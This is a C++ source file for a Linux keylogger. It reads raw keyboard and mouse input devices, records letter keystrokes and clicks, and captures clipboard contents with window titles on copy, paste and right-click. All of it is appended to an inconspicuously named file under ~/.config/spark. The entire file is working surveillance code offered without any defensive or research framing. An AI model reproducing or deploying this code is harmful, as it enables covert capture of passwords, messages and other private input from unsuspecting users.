#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <map>
#include <cstdlib>

using namespace std;

// Key and Mouse Button Maps
std::map<int, std::string> mouseKeyMap = {
    {BTN_LEFT, "[LBUTTON]"},
    {BTN_RIGHT, "[RBUTTON]"}
};

std::map<int, std::string> keyMap = {
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"},
    {KEY_E, "e"}, {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"},
    {KEY_I, "i"}, {KEY_J, "j"}, {KEY_K, "k"}, {KEY_L, "l"},
    {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"}, {KEY_P, "p"},
    {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"},
    {KEY_Y, "y"}, {KEY_Z, "z"}
};

// Function to get the active window name
string getActiveWindowName() {
    char buffer[128];
    string result = "Unknown Window";
    FILE* pipe = popen("xdotool getactivewindow getwindowname", "r");
    if (pipe) {
        if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result = string(buffer);
            result.erase(result.find_last_not_of(" \n\r\t") + 1); // Trim trailing whitespace
        }
        pclose(pipe);
    }
    return result;
}

// Function to get the clipboard content
string getClipboardContent() {
    char buffer[128];
    string result = "";
    FILE* pipe = popen("xclip -o -selection clipboard", "r"); // Use xclip to get clipboard content
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);
    }
    return result;
}

int main() {
    const char* homeDir = getenv("HOME");
    if (!homeDir) {
        cerr << "Error: HOME environment variable not set." << endl;
        return 1;
    }
    string logFilePath = string(homeDir) + "/.config/spark/log.txt";

    vector<int> keyboard_fds; // To store multiple keyboard file descriptors
    vector<int> mouse_fds;    // To store multiple mouse file descriptors
    bool ctrlPressed = false; // Track CTRL key state
    string lastClipboardContent = ""; // Track the last logged clipboard content

    // Open log file
    ofstream logFile(logFilePath, ios::app);
    if (!logFile.is_open()) {
        cerr << "Failed to open log file: " << logFilePath << endl;
        return 1;
    }

    // Find keyboard and mouse devices
    for (int i = 0; i < 32; i++) {
        string devicePath = "/dev/input/event" + to_string(i);
        int fd = open(devicePath.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd != -1) {
            char name[256];
            ioctl(fd, EVIOCGNAME(sizeof(name)), name);
            string deviceName(name);
            if (deviceName.find("keyboard") != string::npos) {
                keyboard_fds.push_back(fd); // Add keyboard device to the list
                cout << "Keyboard device found: " << devicePath << endl;
            } else if (deviceName.find("mouse") != string::npos || deviceName.find("Mouse") != string::npos) {
                mouse_fds.push_back(fd); // Add mouse device to the list
                cout << "Mouse device found: " << devicePath << endl;
            } else {
                close(fd);
            }
        }
    }

    if (keyboard_fds.empty() && mouse_fds.empty()) {
        cerr << "No keyboard or mouse device found." << endl;
        return 1;
    }

    struct input_event event;
    while (true) {
        // Process keyboard events from all detected keyboard devices
        for (int keyboard_fd : keyboard_fds) {
            if (read(keyboard_fd, &event, sizeof(event)) > 0) {
                if (event.type == EV_KEY) {
                    if (event.value == 1) { // Key press
                        if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                            ctrlPressed = true;
                        } else if (ctrlPressed && event.code == KEY_C) { // Detect CTRL+C (copy)
                            string clipboardContent = getClipboardContent();
                            if (!clipboardContent.empty() && clipboardContent != lastClipboardContent) {
                                string windowName = getActiveWindowName();
                                lastClipboardContent = clipboardContent;
                                cout << "[COPY from " << windowName << "]: " << clipboardContent << endl;
                                logFile << "[COPY from " << windowName << "]: " << clipboardContent << endl;
                                logFile.flush();
                            }
                        } else if (ctrlPressed && event.code == KEY_V) { // Detect CTRL+V (paste)
                            string clipboardContent = getClipboardContent();
                            if (!clipboardContent.empty()) {
                                string windowName = getActiveWindowName();
                                cout << "[PASTE in " << windowName << "]: " << clipboardContent << endl;
                                logFile << "[PASTE in " << windowName << "]: " << clipboardContent << endl;
                                logFile.flush();
                            }
                        } else {
                            auto it = keyMap.find(event.code);
                            if (it != keyMap.end()) {
                                cout << it->second;  // Output to console
                                logFile << it->second;
                                logFile.flush();
                            }
                        }
                    } else if (event.value == 0) { // Key release
                        if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                            ctrlPressed = false;
                        }
                    }
                }
            }
        }

        // Process mouse events from all detected mouse devices
        for (int mouse_fd : mouse_fds) {
            if (read(mouse_fd, &event, sizeof(event)) > 0) {
                if (event.type == EV_KEY && event.value == 1) { // Mouse button press
                    if (event.code == BTN_RIGHT) { // Right-click triggers clipboard check
                        string clipboardContent = getClipboardContent();
                        if (!clipboardContent.empty() && clipboardContent != lastClipboardContent) {
                            string windowName = getActiveWindowName();
                            lastClipboardContent = clipboardContent;
                            cout << "[RIGHT-CLICK COPY from " << windowName << "]: " << clipboardContent << endl;
                            logFile << "[RIGHT-CLICK COPY from " << windowName << "]: " << clipboardContent << endl;
                            logFile.flush();
                        }
                    }
                    auto it = mouseKeyMap.find(event.code);
                    if (it != mouseKeyMap.end()) {
                        cout << it->second << endl;  // Output to console
                        logFile << it->second << endl; // Log mouse click
                        logFile.flush();
                    }
                }
            }
        }

        usleep(1000); // Prevent CPU overuse
    }

    // Close devices
    for (int keyboard_fd : keyboard_fds) {
        close(keyboard_fd);
    }
    for (int mouse_fd : mouse_fds) {
        close(mouse_fd);
    }
    logFile.close();
    return 0;
}
